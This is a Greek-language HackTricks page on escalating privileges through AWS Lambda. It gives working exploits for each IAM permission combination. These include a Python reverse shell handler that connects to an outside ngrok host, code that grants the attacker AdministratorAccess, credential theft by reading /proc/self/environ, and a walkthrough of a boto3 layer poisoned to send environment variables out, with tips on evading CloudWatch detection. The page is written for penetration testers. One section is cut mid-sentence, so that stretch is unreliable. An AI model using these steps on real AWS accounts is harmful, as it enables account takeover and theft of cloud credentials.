# AWS - Ενίσχυση Προνομίων Lambda

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## lambda

Περισσότερες πληροφορίες σχετικά με το lambda σε:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Οι χρήστες με τα δικαιώματα **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:InvokeFunction`** μπορούν να ενισχύσουν τα προνόμιά τους.\
Μπορούν **να δημιουργήσουν μια νέα λειτουργία Lambda και να την αναθέσουν σε έναν υπάρχοντα ρόλο IAM**, χορηγώντας στη λειτουργία τα δικαιώματα που σχετίζονται με αυτόν τον ρόλο. Ο χρήστης μπορεί στη συνέχεια **να γράψει και να μεταφορτώσει κώδικα σε αυτήν τη λειτουργία Lambda (με ένα αντίστροφο κέλυφος για παράδειγμα)**.\
Μόλις η λειτουργία είναι εγκατεστημένη, ο χρήστης μπορεί **να ενεργοποιήσει την εκτέλεσή της** και τις επιθυμητές ενέργειες καλώντας τη λειτουργία Lambda μέσω του API του AWS. Με αυτήν την προσέγγιση, ο χρήστης μπορεί αποτελεσματικά να εκτελέσει εργασίες έμμεσα μέσω της λειτουργίας Lambda, λειτουργώντας με το επίπεδο πρόσβασης που χορηγείται στον ρόλο IAM που τη συνοδεύει.\\

Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό για να πάρει ένα **αντίστροφο κέλυφος και να κλέψει το διακριτικό**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Μπορείτε επίσης **να καταχραστείτε τα δικαιώματα του ρόλου του lambda** από τη λειτουργία lambda ίδια.\
Αν ο ρόλος του lambda είχε επαρκή δικαιώματα, θα μπορούσατε να το χρησιμοποιήσετε για να σας χορηγήσει δικαιώματα διαχειριστή:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Είναι επίσης δυνατή η διαρροή των διαπιστευτηρίων ρόλου του lambda χωρίς την ανάγκη εξωτερικής σύνδεσης. Αυτό θα ήταν χρήσιμο για **Διακομισμένα Lambdas** που χρησιμοποιούνται σε εσωτερικές εργασίες. Αν υπάρχουν άγνωστες ομάδες ασφαλείας που φιλτράρουν τις αντίστροφες κελύφωσής σας, αυτό το κομμάτι κώδικα θα σας επιτρέψει να διαρρεύσετε απευθείας τα διαπιστευτήρια ως έξοδο του lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Πιθανή Επίδραση:** Άμεση αύξηση προνομίων στο καθορισμένο ρόλο υπηρεσίας lambda.

{% hint style="danger" %}
Σημειώστε ότι ακόμα κι αν φαίνεται ενδιαφέρον το **`lambda:InvokeAsync`** **δεν** επιτρέπει από μόνο του την εκτέλεση της εντολής **`aws lambda invoke-async`**, χρειάζεστε επίσης το `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Όπως και στο προηγούμενο σενάριο, μπορείτε να **χορηγήσετε στον εαυτό σας την άδεια `lambda:InvokeFunction`** αν έχετε την άδεια **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Πιθανή Επίδραση:** Άμεση ανύψωση προνομίων στο καθορισμένο ρόλο υπηρεσίας lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Οι χρήστες με δικαιώματα **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:CreateEventSourceMapping`** (και πιθανώς `dynamodb:PutItem` και `dynamodb:CreateTable`) μπορούν να ανυψώσουν προνόμια έμμεσα ακόμη και χωρίς το `lambda:InvokeFunction`.\
Μπορούν να δημιουργήσουν μια λειτουργία Lambda με κακόβουλο κώδικα και να της αναθέσουν έναν υπάρχοντα ρόλο IAM.

Αντί να καλέσουν απευθείας τη Lambda, ο χρήστης δημιουργεί ή χρησιμοποιεί έναν υπάρχοντα πίνακα DynamoDB, συνδέοντάς τον με τη Lambda μέσω ενός χαρτογραφημένου πηγής συμβάντος. Αυτή η ρύθμιση εξασφαλίζει ότι η λειτουργία Lambda ενεργοποιείται αυτόματα με την εισαγωγή ενός νέου στοιχείου στον πίνακα, είτε από την ενέργεια του χρήστη είτε από άλλη διαδικασία, ενεργοποιώντας έμμεσα τη λειτουργία Lambda και εκτελώντας τον κώδικα με τα δικαιώματα του περασμένου ρόλου IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Αν το DynamoDB είναι ήδη ενεργό στο περιβάλλον του AWS, ο χρήστης χρειάζεται μόνο να **καθιερώσει την αντιστοίχιση πηγής συμβάντος** για τη λειτουργία Lambda. Ωστόσο, αν το DynamoDB δεν χρησιμοποιείται, ο χρήστης πρέπει να **δημιουργήσει έναν νέο πίνακα** με ενεργοποιημένη τη ϡροχή συμβάντων:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Τώρα είναι δυνατό να **συνδέσετε τη Lambda λειτουργία με τον πίνακα DynamoDB** με τον **δημιουργία εκχώρησης πηγής συμβάντος**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Με τη Lambda λειτουργία που συνδέεται με τη ροή του DynamoDB, ο επιτιθέμενος μπορεί **έμμεσα να ενεργοποιήσει τη Lambda ενεργοποιώντας τη ροή του DynamoDB**. Αυτό μπορεί να επιτευχθεί **εισάγοντας ένα στοιχείο** στον πίνακα του DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Πιθανή Επίπτωση:** Άμεση ανύψωση προνομίων στον ρόλο υπηρεσίας lambda που καθορίζεται.

### `lambda:AddPermission`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί **να χορηγήσει στον εαυτό του (ή σε άλλους) οποιεσδήποτε άδειες** (αυτό δημιουργεί πολιτικές βασισμένες σε πόρους για τη χορήγηση πρόσβασης στον πόρο):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Πιθανή Επίπτωση:** Άμεση αύξηση προνομίων στον ρόλο υπηρεσίας lambda με τη χορήγηση δικαιώματος να τροποποιήσει τον κώδικα και να τον εκτελέσει.

### `lambda:AddLayerVersionPermission`

Ένας επιτιθέμενος με αυτό το δικαίωμα μπορεί **να χορηγήσει στον εαυτό του (ή σε άλλους) το δικαίωμα `lambda:GetLayerVersion`**. Μπορεί να έχει πρόσβαση στο layer και να αναζητήσει ευπαθείς σημεία ή ευαίσθητες πληροφορίες.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Πιθανή Επίπτωση:** Πιθανή πρόσβαση σε ευαίσθητες πληροφορίες.

### `lambda:UpdateFunctionCode`

Οι χρήστες που κατέχουν την άδεια **`lambda:UpdateFunctionCode`** έχουν τη δυνατότητα να **τροποποιήσουν τον κώδικα μιας υπάρχουσας λειτουργίας Lambda που συνδέεται με έναν ρόλο IAM.**\
Ο επιτιθέμενος μπορεί **να τροποποιήσει τον κώδικα της λειτουργίας Lambda για να εξαγάγει τα διαπιστευτήρια IAM**.

Αν και ο επιτιθέμενος ενδέχεται να μην έχει την άμεση δυνατότητα να εκτελέσει τη λειτουργία, εάν η λειτουργία Lambda είναι προϋπάρχουσα και λειτουργική, είναι πιθανό να ενεργοποιηθεί μέσω υπαρχόντων ροών εργασίας ή συμβάντων, διευκολύνοντας έτσι έμμεσα την εκτέλεση του τροποποιημένου κώδικα.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Πιθανή Επίπτωση:** Άμεση αύξηση προνομιακών δικαιωμάτων στον λογαριασμό υπηρεσίας lambda που χρησιμοποιείται.

### `lambda:UpdateFunctionConfiguration`

#### Εισαγωγή

[**Επίπεδα Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) επιτρέπει την συμπερίληψη **κ
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Αυτά είναι τα μέρη:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Για παράδειγμα, η βιβλιοθήκη boto3 φορτώνεται από το `/var/runtime/boto3` (4η θέση).

#### Εκμετάλλευση

**Η προσάρτηση ενός επιπέδου σε μια λειτουργία** απαιτεί μόνο την άδεια `lambda:UpdateFunctionConfiguration` και **τα επίπεδα μπορούν να κοινοποιούνται μεταξύ λογαριασμών**. Θα πρέπει επίσης να γνωρίζουμε **ποιες βιβλιοθήκες χρησιμοποιούν**, ώστε να τις αντικαταστήσουμε σωστά, αλλά σε αυτό το παράδειγμα, θα **υποθέσουμε απλώς ότι η επιτεθείσα λειτουργία εισάγει το boto3**.

Απλώς για λόγους ασφαλείας, θα χρησιμοποιήσουμε το Pip για να εγκαταστήσουμε την ίδια έκδοση της βιβλιοθήκης boto3 από το Lambda runtime που στοχεύουμε (Python 3.7), έτσι ώστε να μην υπάρχει τίποτα διαφορετικό που θα μπορούσε να προκαλέσει προβλήματα στην στόχευση λειτουργία. Αυτή τη στιγμή, το runtime χρησιμοποιεί την έκδοση 1.9.42 του boto3.

Με τον παρακάτω κώδικα, θα εγκαταστήσουμε την έκδοση 1.9.42 του boto3 και τις εξαρτήσεις του σε ένα τοπικό φάκελο "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Στη συνέχεια, θα ανοίξουμε το `/lambda_layer/boto3/__init__.py` και θα προσθέσουμε το κακόβουλο κώδικα. Το φορτίο που θα προσθέσουμε φαίνεται ως εξής:

![](<../../../.gitbook/assets/image (26).png>)

Το `requests` εισάγεται από το `botocore`. Η λειτουργία θα εξαγάγει μεταβλητές περιβάλλοντος, και το try-except και το 0.1 timeout υπάρχουν για να διασφαλίσουν ότι αυτός ο κώδικας δεν θα προκαλέσει προβλήματα.

{% hint style="info" %}
**Σημαντική σημείωση:** Δεν πρέπει πλέον να χρησιμοποιείτε `from botocore.vendored import requests` σε πραγματικά τεστ διείσδυσης, επειδή θα εκτυπωθεί ένα "DeprecationWarning" στα CloudWatch logs της λειτουργίας αυτής, κάτι που πιθανόν θα οδηγήσει στον εντοπισμό σας από έναν υπερασπιστή.
{% endhint %}

Τώρα, συμπιέστε αυτόν τον κώδικα σε ένα **αρχείο ZIP** και **ανεβάστε το** σε ένα **νέο Lambda layer στον λογαριασμό του ΕΠΙΤΑΚΤΗ**. Θα πρέπει να δημιουργήσετε πρώτα έναν φάκελο "python" και να τοποθετήσετε τις βιβλιοθήκες σας εκεί, ώστε όταν το ανεβάσουμε στο Lambda, ο κώδικας θα βρίσκεται στο "/opt/python/boto3". Επίσης, βεβαιωθείτε ότι το layer είναι συμβατό με το Python 3.7 και ότι το **layer βρίσκεται στην ίδια περιοχή με τη λειτουργία στόχο μας**. Αφού γίνει αυτό, θα χρησιμοποιήσουμε το `lambda:AddLayerVersionPermission` για να **κάνουμε το layer δημόσια προσβάσιμο** ώστε ο λογαριασμός στόχος μας να μπορεί να το χρησιμοποιήσει. Χρησιμοποιήστε τα προσωπικά σας διαπιστευτήρια AWS για αυτήν την κλήση API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Τώρα με τα **υποστεθέντα διαπιστευτήρια** που έχουμε, θα εκτελέσουμε την παρακάτω εντολή στη στόχο Lambda λειτουργία μας "s3-getter", η οποία θα **συνδέσει το επίπεδο Lambda σε διαφορετικό λογαριασμό**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Το επόμενο βήμα θα είναι είτε να **εκτελέσουμε τη λειτουργία** μόνοι μας αν μπορούμε, είτε να περιμένουμε μέχρι να **εκτελεστεί** με τους κανονικούς τρόπους - ο οποίος είναι ο ασφαλέστερος τρόπος.

Μια **πιο αόρατη μέθοδος εκμετάλλευσης αυτής της ευπάθειας** μπορεί να βρεθεί στο:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Πιθανή Επίπτωση:** Άμεση αύξηση προνομίων στον ρόλο υπηρεσίας lambda που χρησιμοποιείται.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Ίσως με αυτές τις άδειες να είστε σε θέση να δημιουργήσετε μια λειτουργία και να την εκτελέσετε καλώντας το URL... αλλά δεν μπόρεσα να βρω έναν τρόπο να το δοκιμάσω, οπότε ενημερώστε με αν το κάνετε!

### Lambda MitM

Κάποιες lambdas θα λαμβάνουν **ευαίσθητες πληροφορίες από τους χρήστες σε παραμέτρους.** Αν καταφέρετε RCE σε μία από αυτές, μπορείτε να εξαγάγετε τις πληροφορίες που άλλοι χρήστες στέλνουν σε αυτή, ελέγξτε το στο:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Αναφορές

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
